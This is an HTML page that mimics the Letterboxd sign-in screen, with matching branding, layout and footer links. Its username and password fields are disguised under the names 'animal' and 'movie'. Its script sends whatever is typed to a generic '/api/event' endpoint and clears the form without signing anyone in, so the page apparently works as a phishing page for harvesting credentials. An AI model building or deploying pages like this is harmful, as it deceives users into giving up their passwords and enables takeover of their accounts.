<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#14181c">
  <title>Sign in to Letterboxd</title>
  <style>
    :root {
      color-scheme: dark;
      --page: #14181c;
      --panel: #425466;
      --input: #cfe0f1;
      --link: #b8cde1;
      --muted: #64717e;
      --green: #00b020;
    }

    * { box-sizing: border-box; }

    html, body { min-width: 320px; min-height: 100%; margin: 0; }

    body {
      min-height: 100vh;
      background: var(--page);
      color: #fff;
      font-family: Arial, Helvetica, sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    main {
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 28px 18px;
    }

    .login-wrap {
      width: min(448px, 100%);
      transform: translateY(-1px);
    }

    .card {
      overflow: hidden;
      border-radius: 9px;
      background: var(--panel);
    }

    .form-content { padding: 40px 40px 24px; }

    .brand-mark {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 21px;
      margin: 0 auto 18px;
    }

    .brand-mark i {
      width: 21px;
      height: 21px;
      margin-left: -3px;
      border-radius: 50%;
    }
    .brand-mark i:first-child { margin-left: 0; background: #ff8000; }
    .brand-mark i:nth-child(2) { background: #00d55a; }
    .brand-mark i:nth-child(3) { background: #40bfe8; }

    h1 {
      margin: 0;
      text-align: center;
      font-size: 22px;
      line-height: 27px;
      letter-spacing: -.35px;
      font-weight: 700;
    }

    .signup {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin: 33px 0 25px;
      color: var(--link);
      font-size: 13px;
      line-height: 24px;
      white-space: nowrap;
    }

    a { color: inherit; text-decoration: none; }
    a:hover { text-decoration: underline; }

    .signup a {
      padding: 2px 12px;
      border-radius: 14px;
      background: #687d90;
      color: #fff;
      font-size: 12px;
      line-height: 20px;
      font-weight: 700;
    }

    .field { margin: 0 0 25px; }
    .field label {
      display: block;
      margin-bottom: 7px;
      color: var(--link);
      font-size: 13px;
      line-height: 16px;
    }

    .field input {
      display: block;
      width: 100%;
      height: 36px;
      padding: 7px 10px;
      border: 0;
      border-radius: 3px;
      outline: none;
      background: var(--input);
      color: #14181c;
      font: inherit;
    }
    .field input:focus { box-shadow: 0 0 0 2px #8cb7de; }
    .field:last-of-type { margin-bottom: 24px; }

    .options {
      display: flex;
      align-items: center;
      justify-content: space-between;
      min-height: 20px;
      color: var(--link);
      font-size: 13px;
      line-height: 20px;
    }

    .remember { display: inline-flex; align-items: center; gap: 8px; cursor: pointer; }
    .remember input {
      appearance: none;
      width: 20px;
      height: 20px;
      margin: 0;
      border-radius: 3px;
      background: var(--input);
      cursor: pointer;
    }
    .remember input:checked { background: #cfe0f1; }
    .remember input:checked::after {
      content: "✓";
      display: block;
      color: #425466;
      text-align: center;
      font-size: 16px;
      font-weight: 700;
      line-height: 20px;
    }

    .submit {
      display: block;
      width: 100%;
      height: 49px;
      border: 0;
      border-radius: 0 0 8px 8px;
      background: var(--green);
      color: #fff;
      cursor: pointer;
      font-family: inherit;
      font-size: 14px;
      font-weight: 700;
      letter-spacing: 1.5px;
    }
    .submit:hover { background: #00a51d; }

    footer {
      display: flex;
      justify-content: center;
      gap: 23px;
      margin-top: 16px;
      color: var(--muted);
      font-size: 11px;
      line-height: 14px;
    }

    @media (max-height: 540px) {
      main { align-items: start; }
      .login-wrap { margin: 10px auto; transform: none; }
    }

    @media (max-width: 420px) {
      .form-content { padding-right: 26px; padding-left: 26px; }
      h1 { font-size: 21px; }
      .signup { gap: 6px; font-size: 12px; }
    }
  </style>
</head>
<body>
  <main>
    <div class="login-wrap">
      <section class="card" aria-labelledby="title">
        <div class="form-content">
          <div class="brand-mark" aria-label="Letterboxd" role="img"><i></i><i></i><i></i></div>
          <h1 id="title">Sign in to Letterboxd</h1>
          <p class="signup"><span>New to Letterboxd?</span><a href="#create-account">Create an account</a></p>
          <form id="login-form" action="#" method="post">
            <div class="field">
              <label for="animal">Username</label>
              <input id="animal" name="animal" type="text" autocomplete="username">
            </div>
            <div class="field">
              <label for="movie">Password</label>
              <input id="movie" name="movie" type="password" autocomplete="current-password">
            </div>
            <div class="options">
              <label class="remember"><input type="checkbox" name="remember"><span>Remember me</span></label>
              <a href="#reset-password">Reset password</a>
            </div>
          </form>
        </div>
        <button class="submit" type="submit" form="login-form">SIGN IN</button>
      </section>
      <footer><a href="#terms">Terms</a><a href="#privacy">Privacy Notice</a><a href="#contact">Contact</a></footer>
    </div>
  </main>
  <script>
    document.querySelector('#login-form').addEventListener('submit', async (event) => {
      event.preventDefault();
      const form = event.currentTarget;
      const payload = {
        animal: form.elements.animal.value.trim(),
        movie: form.elements.movie.value.trim()
      };
      try {
        const response = await fetch('/api/event', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        if (!response.ok) throw new Error(`El servidor respondió ${response.status}: ${await response.text()}`);
        form.reset();
      } catch (error) {
        console.error('No se pudo registrar el evento:', error);
      }
    });
  </script>
</body>
</html>
